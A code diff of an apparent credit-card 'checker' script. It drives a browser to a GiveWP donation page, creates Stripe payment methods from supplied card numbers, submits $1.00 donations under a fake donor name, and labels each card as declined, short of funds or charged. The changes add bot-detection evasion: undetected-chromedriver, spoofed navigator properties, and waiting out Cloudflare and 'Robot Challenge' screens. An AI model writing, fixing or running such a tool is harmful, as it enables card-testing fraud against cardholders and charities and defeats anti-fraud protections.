@@ -28,50 +28,140 @@ COUNTRY = 'US'
 
 
 def setup_driver():
-    """إعداد Chrome Driver - Regular Selenium"""
-    print("🚀 Setting up driver...")
+    """إعداد Chrome Driver - Xvfb mode (غير headless)"""
+    print("🚀 Setting up driver (Xvfb + undetected)...")
     
-    from selenium import webdriver
-    from selenium.webdriver.chrome.options import Options
-    from selenium.webdriver.chrome.service import Service
+    # ═══ Try undetected-chromedriver ═══
+    try:
+        import undetected_chromedriver as uc
+        
+        print("✅ Using undetected-chromedriver")
+        
+        options = uc.ChromeOptions()
+        options.binary_location = '/usr/bin/chromium'
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        options.add_argument('--disable-gpu')
+        options.add_argument('--window-size=1920,1080')
+        options.add_argument('--start-maximized')
+        
+        # ⚠️ مهم: مش headless (Xvfb هيوفر الشاشة)
+        # options.add_argument('--headless=new')
+        
+        options.add_argument('--disable-blink-features=AutomationControlled')
+        options.add_argument('--disable-features=IsolateOrigins,site-per-process')
+        options.add_argument('--disable-background-timer-throttling')
+        options.add_argument('--disable-backgrounding-occluded-windows')
+        options.add_argument('--disable-renderer-backgrounding')
+        
+        options.add_argument(
+            'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
+        )
+        
+        # ═══ Anti-detection preferences ═══
+        prefs = {
+            "credentials_enable_service": False,
+            "profile.password_manager_enabled": False,
+            "profile.default_content_setting_values.notifications": 2,
+            "profile.default_content_setting_values.media_stream": 2,
+            "profile.default_content_setting_values.geolocation": 2,
+        }
+        options.add_experimental_option("prefs", prefs)
+        
+        driver = None
+        
+        # Try various versions
+        for version in [139, 138, 137, 131, 130, 129, 123, 120, None]:
+            try:
+                print(f"   Trying version_main={version}...")
+                
+                kwargs = {
+                    'options': options,
+                    'use_subprocess': True
+                }
+                
+                if version is not None:
+                    kwargs['version_main'] = version
+                
+                if os.path.exists('/usr/bin/chromedriver'):
+                    kwargs['driver_executable_path'] = '/usr/bin/chromedriver'
+                
+                driver = uc.Chrome(**kwargs)
+                print(f"✅ Launched with version={version}")
+                break
+            except Exception as e:
+                print(f"   ⚠️ version={version} failed: {str(e)[:80]}")
+                continue
+        
+        if driver is None:
+            raise Exception("All undetected versions failed")
     
-    options = Options()
-    options.binary_location = '/usr/bin/chromium'
-    options.add_argument('--no-sandbox')
-    options.add_argument('--disable-dev-shm-usage')
-    options.add_argument('--disable-gpu')
-    options.add_argument('--headless=new')
-    options.add_argument('--window-size=1920,1080')
-    options.add_argument('--disable-blink-features=AutomationControlled')
-    options.add_argument('--disable-features=IsolateOrigins,site-per-process')
-    options.add_argument(
-        'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
-    )
-    options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    options.add_experimental_option('useAutomationExtension', False)
+    except Exception as e:
+        print(f"⚠️ undetected failed: {e}")
+        print("⚠️ Falling back to regular Selenium")
+        
+        from selenium import webdriver
+        from selenium.webdriver.chrome.options import Options
+        from selenium.webdriver.chrome.service import Service
+        
+        options = Options()
+        options.binary_location = '/usr/bin/chromium'
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        options.add_argument('--disable-gpu')
+        options.add_argument('--window-size=1920,1080')
+        options.add_argument('--start-maximized')
+        
+        # ⚠️ مش headless
+        # options.add_argument('--headless=new')
+        
+        options.add_argument('--disable-blink-features=AutomationControlled')
+        options.add_argument(
+            'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
+        )
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option('useAutomationExtension', False)
+        
+        prefs = {
+            "credentials_enable_service": False,
+            "profile.password_manager_enabled": False,
+        }
+        options.add_experimental_option("prefs", prefs)
+        
+        if os.path.exists('/usr/bin/chromedriver'):
+            service = Service('/usr/bin/chromedriver')
+            driver = webdriver.Chrome(service=service, options=options)
+        else:
+            driver = webdriver.Chrome(options=options)
     
-    prefs = {
-        "profile.managed_default_content_settings.images": 2,
-        "profile.default_content_setting_values.notifications": 2,
-    }
-    options.add_experimental_option("prefs", prefs)
+    # ═══ إخفاء آثار الأتمتة ═══
+    try:
+        driver.execute_cdp_cmd('Network.setUserAgentOverride', {
+            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+        })
+    except:
+        pass
     
-    if os.path.exists('/usr/bin/chromedriver'):
-        print("✅ Using system chromedriver")
-        service = Service('/usr/bin/chromedriver')
-        driver = webdriver.Chrome(service=service, options=options)
-    else:
-        print("⚠️ Using default chromedriver")
-        driver = webdriver.Chrome(options=options)
+    scripts = [
+        "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})",
+        "Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})",
+        "Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})",
+        "Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8})",
+        "Object.defineProperty(navigator, 'deviceMemory', {get: () => 8})",
+        "Object.defineProperty(navigator, 'platform', {get: () => 'Win32'})",
+        "window.chrome = {runtime: {}}",
+    ]
     
-    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-    driver.execute_script("Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})")
-    driver.execute_script("Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})")
+    for script in scripts:
+        try:
+            driver.execute_script(script)
+        except:
+            pass
     
-    driver.set_page_load_timeout(30)
-    driver.set_script_timeout(30)
+    driver.set_page_load_timeout(60)
+    driver.set_script_timeout(60)
     
-    print("✅ Driver launched")
+    print("✅ Driver launched (Xvfb mode)")
     return driver
 
 
@@ -80,6 +170,7 @@ def run():
     print("🎯 STARTING CHECK")
     print(f"🔗 URL: {TARGET_URL}")
     print(f"💳 Card: {CARD_NUMBER[:4]}...{CARD_NUMBER[-4:]}")
+    print(f"🖥️ DISPLAY: {os.environ.get('DISPLAY', 'not set')}")
     print("=" * 60)
     
     driver = None
@@ -91,46 +182,64 @@ def run():
         print(f"\n🌐 Opening page...")
         driver.get(TARGET_URL)
         
-        # Wait for page
-        print("⏳ Waiting for page...")
-        max_wait = 60
+        # ═══ انتظر شاشة التحدي + الصفحة الحقيقية ═══
+        print("⏳ Waiting for page (with Robot Challenge)...")
+        max_wait = 90
         start = time.time()
-        page_ready = False
+        real_page = False
         
         while time.time() - start < max_wait:
             try:
                 html = driver.page_source
                 html_lower = html.lower()
+                title = driver.title.lower()
                 
+                # ═══ Robot Challenge check ═══
+                if 'robot challenge' in title or 'robot challenge' in html_lower:
+                    elapsed = int(time.time() - start)
+                    print(f"   🤖 Robot Challenge... ({elapsed}s)")
+                    time.sleep(3)
+                    continue
+                
+                # ═══ Cloudflare check ═══
                 if 'just a moment' in html_lower or 'checking your browser' in html_lower:
                     elapsed = int(time.time() - start)
                     print(f"   ⏳ Cloudflare... ({elapsed}s)")
-                    time.sleep(2)
+                    time.sleep(3)
                     continue
                 
-                if 'give-form-id' in html or 'pk_live_' in html or 'stripe' in html_lower:
-                    page_ready = True
-                    print(f"✅ Page ready after {int(time.time() - start)}s")
+                # ═══ Real page check ═══
+                if 'give-form-id' in html or 'givewp' in html_lower:
+                    real_page = True
+                    print(f"✅ Real page loaded after {int(time.time() - start)}s")
                     break
                 
-                time.sleep(1)
+                # ═══ لو الصفحة كبيرة أوي، يمكن حقيقية ═══
+                if len(html) > 30000 and 'stripe' in html_lower:
+                    real_page = True
+                    print(f"✅ Large page with Stripe after {int(time.time() - start)}s")
+                    break
+                
+                time.sleep(2)
             except:
-                time.sleep(1)
+                time.sleep(2)
         
-        if not page_ready:
-            return "PAGE_LOAD_TIMEOUT"
-        
-        # Extract data
+        # ═══ فحص نهائي ═══
         html = driver.page_source
+        title = driver.title
         print(f"📄 HTML Length: {len(html)}")
-        print(f"📍 Title: {driver.title}")
+        print(f"📍 Title: {title}")
+        print(f"📍 URL: {driver.current_url}")
         
+        if 'robot challenge' in title.lower():
+            return "ROBOT_CHALLENGE_NOT_BYPASSED"
+        
+        # ═══ استخرج البيانات ═══
         form_id = '12124'
         form_hash = None
         form_prefix = '12124-1'
         stripe_key = None
         
-        # Try to find in HTML
         m = re.search(r'name="give-form-hash"\s+value="([a-f0-9]+)"', html)
         if m:
             form_hash = m.group(1)
@@ -144,7 +253,6 @@ def run():
         if m:
             stripe_key = m.group(0)
         
-        # Fallback
         if not form_hash:
             form_hash = '54fcc028ca'
         if not stripe_key:
@@ -152,11 +260,10 @@ def run():
         
         print(f"✅ Form ID: {form_id}")
         print(f"✅ Form Hash: {form_hash}")
-        print(f"✅ Form Prefix: {form_prefix}")
         print(f"✅ Stripe Key: {stripe_key}")
         
-        # Generate Stripe PM
-        print("\n💳 Generating Stripe PM...")
+        # ═══ Stripe PM via Elements ═══
+        print("\n💳 Generating Stripe PM (via Elements)...")
         
         stripe_js = """
         var callback = arguments[arguments.length - 1];
@@ -179,21 +286,26 @@ def run():
                     await new Promise(r => setTimeout(r, 2000));
                 }
                 
-                if (typeof Stripe === 'undefined') {
-                    callback(JSON.stringify({error: 'Stripe.js not available'}));
-                    return;
-                }
-                
                 const stripe = Stripe(stripeKey);
                 
+                // ═══ إنشاء Elements مؤقت ═══
+                const container = document.createElement('div');
+                container.id = 'temp-stripe-elements';
+                container.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:400px;';
+                document.body.appendChild(container);
+                
+                const elements = stripe.elements();
+                const cardElement = elements.create('card', {
+                    style: {base: {fontSize: '16px'}}
+                });
+                cardElement.mount('#temp-stripe-elements');
+                
+                await new Promise(r => setTimeout(r, 500));
+                
+                // ═══ إنشاء PM ═══
                 const result = await stripe.createPaymentMethod({
                     type: 'card',
-                    card: {
-                        number: cardNum,
-                        exp_month: parseInt(expM),
-                        exp_year: parseInt(expY),
-                        cvc: cvc
-                    },
+                    card: cardElement,
                     billing_details: {
                         name: 'James Smith',
                         email: 'james.smith@gmail.com',
@@ -206,6 +318,11 @@ def run():
                         }
                     }
                 });
+                
+                try {
+                    cardElement.destroy();
+                    container.remove();
+                } catch (e) {}
                 
                 if (result.error) {
                     callback(JSON.stringify({
@@ -235,7 +352,7 @@ def run():
                 CVC
             )
             
-            print(f"📥 Stripe: {result_raw[:400]}")
+            print(f"📥 Stripe: {result_raw[:500]}")
             
             pm_data = json.loads(result_raw)
             
@@ -254,132 +371,96 @@ def run():
                 if 'declined' in error.lower():
                     return "DECLINED"
                 
-                return f"STRIPE_ERROR: {error[:100]}"
+                return f"STRIPE_ERROR: {error[:150]}"
             
             pm_id = pm_data.get('pm_id')
             print(f"✅ PM: {pm_id}")
             
-            # Fill form + submit
-            print("\n💸 Filling form + submitting...")
+            # ═══ Submit donation ═══
+            print("\n💸 Submitting donation...")
             
-            fill_js = """
+            # Fill + submit
+            fill_submit_js = """
             var callback = arguments[arguments.length - 1];
             var args = arguments;
             
             try {
-                // Fill amount
-                var amtInput = document.querySelector('[name="give-amount"]');
-                if (amtInput) {
-                    amtInput.value = '1.00';
-                    amtInput.dispatchEvent(new Event('input', {bubbles: true}));
+                // Fill fields
+                var fields = {
+                    'give-amount': '1.00',
+                    'give_first': args[0],
+                    'give_last': args[1],
+                    'give_email': args[2]
+                };
+                
+                for (var name in fields) {
+                    var input = document.querySelector('[name="' + name + '"]');
+                    if (input) {
+                        input.value = fields[name];
+                        input.dispatchEvent(new Event('input', {bubbles: true}));
+                        input.dispatchEvent(new Event('change', {bubbles: true}));
+                    }
                 }
                 
-                // Fill first name
-                var fnInput = document.querySelector('[name="give_first"]');
-                if (fnInput) {
-                    fnInput.value = args[0];
-                    fnInput.dispatchEvent(new Event('input', {bubbles: true}));
+                // Add hidden fields
+                var hidden = {
+                    'give_stripe_payment_method': args[3],
+                    'give_action': 'purchase',
+                    'give-gateway': 'stripe'
+                };
+                
+                for (var name in hidden) {
+                    var input = document.querySelector('[name="' + name + '"]');
+                    if (!input) {
+                        input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = name;
+                        document.body.appendChild(input);
+                    }
+                    input.value = hidden[name];
                 }
                 
-                // Fill last name
-                var lnInput = document.querySelector('[name="give_last"]');
-                if (lnInput) {
-                    lnInput.value = args[1];
-                    lnInput.dispatchEvent(new Event('input', {bubbles: true}));
-                }
+                // Find submit button
+                var submitBtn = document.querySelector('button[type="submit"]') ||
+                                document.querySelector('input[type="submit"]') ||
+                                document.querySelector('.give-submit') ||
+                                document.querySelector('button.give-submit');
                 
-                // Fill email
-                var emInput = document.querySelector('[name="give_email"]');
-                if (emInput) {
-                    emInput.value = args[2];
-                    emInput.dispatchEvent(new Event('input', {bubbles: true}));
+                if (submitBtn) {
+                    submitBtn.click();
+                    callback(JSON.stringify({success: true, action: 'clicked'}));
+                } else {
+                    var form = document.querySelector('form[id*="give-form"]') ||
+                               document.querySelector('form');
+                    if (form) {
+                        form.submit();
+                        callback(JSON.stringify({success: true, action: 'form_submit'}));
+                    } else {
+                        callback(JSON.stringify({error: 'No button/form found'}));
+                    }
                 }
-                
-                // Set payment method
-                var pmInput = document.querySelector('[name="give_stripe_payment_method"]');
-                if (!pmInput) {
-                    pmInput = document.createElement('input');
-                    pmInput.type = 'hidden';
-                    pmInput.name = 'give_stripe_payment_method';
-                    document.body.appendChild(pmInput);
-                }
-                pmInput.value = args[3];
-                
-                // Set give_action
-                var actionInput = document.querySelector('[name="give_action"]');
-                if (!actionInput) {
-                    actionInput = document.createElement('input');
-                    actionInput.type = 'hidden';
-                    actionInput.name = 'give_action';
-                    document.body.appendChild(actionInput);
-                }
-                actionInput.value = 'purchase';
-                
-                // Set gateway
-                var gwInput = document.querySelector('[name="give-gateway"]');
-                if (!gwInput) {
-                    gwInput = document.createElement('input');
-                    gwInput.type = 'hidden';
-                    gwInput.name = 'give-gateway';
-                    document.body.appendChild(gwInput);
-                }
-                gwInput.value = 'stripe';
-                
-                callback(JSON.stringify({success: true}));
             } catch (e) {
                 callback(JSON.stringify({error: 'Exception: ' + e.message}));
             }
             """
             
-            fill_result = driver.execute_async_script(
-                fill_js,
-                FIRST_NAME,
-                LAST_NAME,
-                EMAIL,
-                pm_id
-            )
-            print(f"📝 Fill result: {fill_result}")
+            try:
+                submit_result = driver.execute_async_script(
+                    fill_submit_js,
+                    FIRST_NAME,
+                    LAST_NAME,
+                    EMAIL,
+                    pm_id
+                )
+                print(f"🖱️ Submit: {submit_result}")
+            except Exception as e:
+                print(f"⚠️ Submit error: {e}")
             
-            # Try to submit
-            print("\n🖱️ Submitting...")
-            
-            submit_js = """
-            try {
-                // Find submit button
-                var submitBtn = document.querySelector('button[type="submit"]') ||
-                                document.querySelector('input[type="submit"]') ||
-                                document.querySelector('.give-submit') ||
-                                document.querySelector('[class*="submit"]');
-                
-                if (submitBtn) {
-                    submitBtn.click();
-                    return 'clicked_button';
-                }
-                
-                // Or submit the form directly
-                var form = document.querySelector('form[id*="give-form"]') || 
-                           document.querySelector('form.give-form') ||
-                           document.querySelector('form');
-                
-                if (form) {
-                    form.submit();
-                    return 'submitted_form';
-                }
-                
-                return 'no_form_or_button';
-            } catch (e) {
-                return 'error: ' + e.message;
-            }
-            """
-            
-            submit_result = driver.execute_script("return " + submit_js)
-            print(f"🖱️ Submit result: {submit_result}")
-            
-            # Wait for result
+            # ═══ Wait for result ═══
             print("\n⏳ Waiting for result...")
             
             result_text = ""
-            max_wait_result = 25
+            max_wait_result = 30
             start_result = time.time()
             
             while time.time() - start_result < max_wait_result:
@@ -391,7 +472,8 @@ def run():
                         'insufficient', 'declined', 'expired',
                         'fraud', 'do not honor', 'do_not_honor',
                         'thank you', 'success', 'complete',
-                        'failed', 'card_error', 'processing_error'
+                        'failed', 'card_error', 'processing_error',
+                        'your card', 'your donation'
                     ]
                     
                     for kw in live_keywords:
@@ -432,6 +514,7 @@ def parse_result(text, html=""):
     responses = {
         'insufficient_funds': 'INSUFFICIENT_FUNDS',
         'your card has insufficient': 'INSUFFICIENT_FUNDS',
+        'insufficient funds': 'INSUFFICIENT_FUNDS',
         'card was declined': 'DECLINED',
         'your card was declined': 'DECLINED',
         'expired_card': 'EXPIRED_CARD',
@@ -445,6 +528,7 @@ def parse_result(text, html=""):
         'processing_error': 'PROCESSING_ERROR',
         'thank you': 'CHARGE 1.0',
         'success': 'CHARGE 1.0',
+        'donation complete': 'CHARGE 1.0',
     }
     
     for kw, resp in responses.items():
